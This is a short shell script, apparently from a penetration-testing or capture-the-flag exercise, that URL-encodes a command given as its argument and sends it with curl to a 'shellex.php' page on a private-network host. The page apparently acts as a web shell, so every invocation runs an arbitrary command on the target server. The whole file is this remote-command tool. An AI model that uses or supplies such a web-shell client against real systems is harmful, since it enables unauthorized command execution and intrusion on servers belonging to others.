if [ $# -eq 0 ]; then
    echo "Error: no command provided."
    exit 1
fi

encodedCommand=$(echo -n "$1" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')

curl "http://192.168.103.3/admin/shellex.php?raw=1&cmd=$encodedCommand"
